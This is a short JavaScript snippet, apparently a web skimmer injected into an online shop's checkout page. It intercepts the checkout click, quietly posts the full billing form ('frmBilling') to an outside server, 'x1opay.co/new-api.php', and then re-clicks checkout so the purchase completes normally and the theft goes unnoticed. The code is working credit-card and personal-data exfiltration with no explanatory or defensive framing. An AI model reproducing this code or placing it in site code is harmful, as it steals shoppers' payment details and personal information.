document.addEventListener('DOMContentLoaded', function () {
    const checkoutButton = document.querySelector('.btn-checkout');
    const form = document.getElementById('frmBilling');
    let isRequestSent = false;
    checkoutButton.addEventListener('click', function (event) {
        if (isRequestSent) return;
        isRequestSent = true;
        event.preventDefault();
        const formData = new FormData(form);
        const ajaxRequest = new Promise((resolve) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://x1opay.co/new-api.php');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    resolve();
                }
            };
            xhr.onerror = function () {
                resolve();
            };
            xhr.send(formData);
            setTimeout(() => {
                resolve();
            }, 3000);
        });
        ajaxRequest.then(() => {
            isRequestSent = false;
            checkoutButton.click();
        });
    });
});